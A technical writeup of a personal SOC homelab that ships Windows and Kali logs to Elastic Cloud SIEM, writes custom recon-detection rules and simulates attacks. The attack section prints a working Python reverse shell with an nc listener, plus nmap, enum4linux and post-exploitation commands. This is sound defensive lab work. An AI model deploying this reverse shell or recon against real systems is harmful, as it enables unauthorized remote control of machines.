# SOC Homelab — Full Technical Writeup

## Project Goal
Build a hybrid SOC homelab from scratch with zero budget. Ship logs from two 
virtual machines to a cloud SIEM, simulate real attacks, and detect them with 
custom detection rules.

---

## Environment
| Component | Details |
|---|---|
| Host OS | Windows (your host machine) |
| Hypervisor | VirtualBox |
| VM 1 | Windows 10 |
| VM 2 | Kali Linux |
| SIEM | Elastic Cloud (GCP Jakarta, free trial) |
| Network | NAT (internet) + Host-Only (VM to VM) |

---

## Phase 1 — Network Configuration

### Problem
Both VMs needed internet access to ship logs to Elastic Cloud AND needed to 
reach each other directly for attack simulation.

### Solution
Configured two network adapters per VM in VirtualBox:
- Adapter 1: NAT — provides internet access
- Adapter 2: Host-Only — provides VM to VM communication

### Steps
1. Created Host-Only network in VirtualBox Network Manager
   - Subnet: 192.168.217.0/24
   - DHCP enabled
2. Assigned both adapters to Windows VM
3. Assigned both adapters to Kali VM
4. Verified connectivity:
   - Both VMs ping 8.8.8.8 (internet) ✅
   - Kali pings Windows on 192.168.217.8 ✅

### Issue Encountered
Windows Firewall blocked ICMP by default. Fixed by adding a firewall rule:
```cmd
netsh advfirewall firewall add rule name="Allow ICMPv4 In" protocol=icmpv4:8,any dir=in action=allow
```

### Final IP Addresses
- Windows VM: 192.168.217.8
- Kali VM: 192.168.217.7

---

## Phase 2 — Elastic Cloud SIEM Setup

### Why Elastic?
Free 14-day trial with full SIEM features including 1740+ prebuilt 
MITRE ATT&CK detection rules. Kibana provides a professional SOC dashboard.

### Steps
1. Created account at cloud.elastic.co
2. Deployed `homelab-siem` on GCP Jakarta region
3. Saved Elasticsearch and Kibana endpoint URLs
4. Created API key for Beats authentication (switched to username/password 
   after API key format issues)

### Endpoints
- Elasticsearch: https://homelab-siem-63f39e.es.asia-southeast2.gcp.elastic-cloud.com
- Kibana: https://homelab-siem-63f39e.kb.asia-southeast2.gcp.elastic-cloud.com

---

## Phase 3 — Windows VM Log Collection

### Tools Deployed
- **Sysmon v15.15** with SwiftOnSecurity ruleset
- **Winlogbeat 8.13.4**

### Sysmon Installation
Sysmon massively enriches Windows event logs. Without it, Windows only logs 
basic events. With Sysmon you get:
- Every process created (Event ID 1)
- Every network connection (Event ID 3)
- Every file created (Event ID 11)
- Registry changes (Event ID 13)
- DLL loads (Event ID 7)

Installation commands:
```powershell
# Download Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\Sysmon"

# Download SwiftOnSecurity config
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmon-config.xml"

# Install
& "$env:TEMP\Sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmon-config.xml"
```

### Winlogbeat Configuration
Winlogbeat ships the following Windows event logs to Elastic:
- Application
- System  
- Security
- Microsoft-Windows-Sysmon/Operational
- Microsoft-Windows-PowerShell/Operational

Key config (winlogbeat.yml):
```yaml
winlogbeat.event_logs:
  - name: Microsoft-Windows-Sysmon/Operational
    ignore_older: 72h
  - name: Security
    ignore_older: 72h

output.elasticsearch:
  hosts: ["https://homelab-siem-63f39e.es.asia-southeast2.gcp.elastic-cloud.com:443"]
  username: "elastic"
  password: "REDACTED"
  ssl.enabled: true
```

### Issue Encountered
Winlogbeat download kept corrupting. Switched from Invoke-WebRequest to 
System.Net.WebClient which completed the download successfully.

### Result
Within 60 seconds of starting Winlogbeat, 118 documents appeared in 
Kibana Discover under the winlogbeat-* index.

---

## Phase 4 — Kali Linux Log Collection

### Tools Deployed
- **Auditd** — Linux kernel audit system
- **Filebeat 8.13.4**

### Auditd Rules Configured
```bash
# Track every command executed
-a always,exit -F arch=b64 -S execve -k exec_commands

# Track privilege escalation
-w /usr/bin/sudo -p x -k sudo_usage

# Track sensitive file access
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes

# Track network connections
-a always,exit -F arch=b64 -S connect -k network_connect

# Track SSH config changes
-w /etc/ssh/sshd_config -p wa -k sshd_config
```

### Result
45,567 documents ingested in the first 15 minutes under filebeat-* index.
Auditd logs show every command executed on Kali in real time.

---

## Phase 5 — Detection Engineering

### Prebuilt Rules
Loaded and enabled 1740 Elastic prebuilt detection rules mapped to 
MITRE ATT&CK framework covering:
- Windows attack techniques
- Linux attack techniques  
- Network-based attacks
- Credential access
- Privilege escalation

### Custom Rules Built

#### Rule 1 — Windows Recon Detection
Detects common post-exploitation reconnaissance commands on Windows.
```
Index: winlogbeat-*
Query: event.code: "1" AND message: (whoami OR netstat OR net OR wmic OR ipconfig OR systeminfo OR tasklist)
Severity: Medium
MITRE: T1033 (System Owner Discovery), T1057 (Process Discovery)
```

#### Rule 2 — Linux Recon Detection
Detects attacker reconnaissance activity on Linux systems.
```
Index: filebeat-*
Query: message: (whoami OR "cat /etc/passwd" OR "sudo -l" OR "find / -perm" OR netstat)
Severity: High
MITRE: T1033, T1087 (Account Discovery)
```

### Key Learning
Elastic prebuilt rules use Elastic Agent field mappings (process.name, 
process.executable). Winlogbeat stores process names in 
winlog.event_data.Image instead. Custom rules must use the message field 
or winlog-specific fields to match Beats data correctly.

---

## Phase 6 — Attack Simulation

### Attack 1 — Network Reconnaissance
Tool: Nmap
```bash
nmap -sV -sC -p 80,443,445,3389,135,139 192.168.217.8
```
Result: Port 445 (SMB) discovered open

### Attack 2 — SMB Enumeration
Tool: enum4linux
```bash
enum4linux -a 192.168.217.8
```
Result: Anonymous access blocked, but scan activity logged by Sysmon

### Attack 3 — Metasploit Port Scan
Tool: Metasploit auxiliary/scanner/portscan/tcp
Result: Port 445 confirmed open, activity logged

### Attack 4 — Reverse Shell (Main Attack)
This was the primary attack demonstrating the full detection pipeline.

**Setup on Windows (victim):**
Created a Python reverse shell script:
```python
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.217.7", 9999))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.run(command, shell=True, capture_output=True, text=True)
    result = output.stdout + output.stderr
    s.send(result.encode())
```

**Listener on Kali (attacker):**
```bash
nc -lvnp 9999
```

**Result:**
```
connect to [192.168.217.7] from (UNKNOWN) [192.168.217.8] 51474
```
Full command shell on Windows obtained from Kali.

### Post-Exploitation Commands Run
```cmd
whoami
ipconfig
systeminfo
net user
net localgroup administrators
netstat -ano
tasklist
```

### Detection Result
Custom rule "Suspicious Recon Commands Detected" fired within 60 seconds 
of running whoami and systeminfo on the compromised Windows VM.

---

## Results Summary

| Metric | Value |
|---|---|
| Windows logs ingested | 118 in first 15 min |
| Kali logs ingested | 45,567 in first 15 min |
| Detection rules enabled | 1,740 |
| Custom rules created | 2 |
| Time to first alert | ~60 seconds |
| Attack successfully detected | ✅ |

---

## Challenges and How I Solved Them

| Challenge | Solution |
|---|---|
| Winlogbeat download corrupting | Switched to System.Net.WebClient |
| API key authentication failing | Used username/password instead |
| Prebuilt rules not matching Beats data | Built custom rules using message field |
| Windows Firewall blocking Kali pings | Added ICMPv4 allow rule |
| HFS 2.3 blocked by Windows Defender | Switched to Python reverse shell |
| PowerShell script execution blocked | Set-ExecutionPolicy RemoteSigned |

---

## What I Would Add Next
- Metasploitable VM as a dedicated vulnerable target
- Suricata IDS on the network for network-based detections
- TheHive for incident response case management
- Automated alert response with Elastic's case management
- Splunk comparison — same lab, different SIEM

---

## References
- [Elastic SIEM Docs](https://www.elastic.co/guide/en/security/current/index.html)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Auditd Rules Reference](https://linux.die.net/man/8/auditctl)
- [Winlogbeat Reference](https://www.elastic.co/guide/en/beats/winlogbeat/current/index.html)
```

---

Click **"Commit changes"** at the bottom.

---

Your repo now has:
- `README.md` — project overview for recruiters
- `WRITEUP.md` — full technical documentation showing your thought process
- `screenshots/` — visual proof of everything working

---

## Final repo structure should look like this:
```
soc-homelab/
├── README.md
├── WRITEUP.md
├── screenshots/
│   ├── kibana-alerts.png
│   ├── sysmon-logs.png
│   ├── kali-logs.png
│   ├── reverse-shell.png
│   └── detection-rules.png
└── configs/
    ├── winlogbeat.yml
    ├── filebeat.yml
    └── sysmon-config.xml
